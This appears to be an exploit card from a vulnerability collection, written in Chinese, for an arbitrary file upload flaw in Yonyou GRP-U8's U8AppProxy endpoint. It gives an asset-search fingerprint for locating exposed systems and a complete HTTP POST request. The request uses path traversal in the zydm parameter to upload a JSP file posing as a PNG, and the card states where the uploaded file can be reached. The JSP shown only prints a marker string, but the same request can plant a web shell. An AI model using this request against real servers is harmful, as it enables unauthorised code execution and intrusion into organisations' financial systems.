# 用友GRP-U8U8AppProxy任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="用友-GRP-U8"`
- **请求**：`POST /U8AppProxy?gnid=myinfo&id=saveheader&zydm=../../yongyouU8_test HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: JSESSIONID=635F2271089E7A7E66F3F84824553DEE`　`If-Modified-Since: Mon, 01 Feb 2016 08:01:00 GMT`　`If-None-Match: W/"5732-1454313660000"`　`Content-Type: multipart/form-data; boundary=59229605f98b8cf290a7b8908b3461…`　`Content-Length: 194`

**请求体 / payload**
```
--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name="file"; filename="1.jsp"
Content-Type: image/png
<% out.println("yongyouu8");%>
--59229605f98b8cf290a7b8908b34616b--

上传文件位置：
http://xx.xx.xx.xx/yongyouU8_test.jsp
```

**其他**
- 用友GRP-U8 U8AppProxy任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友GRP-U8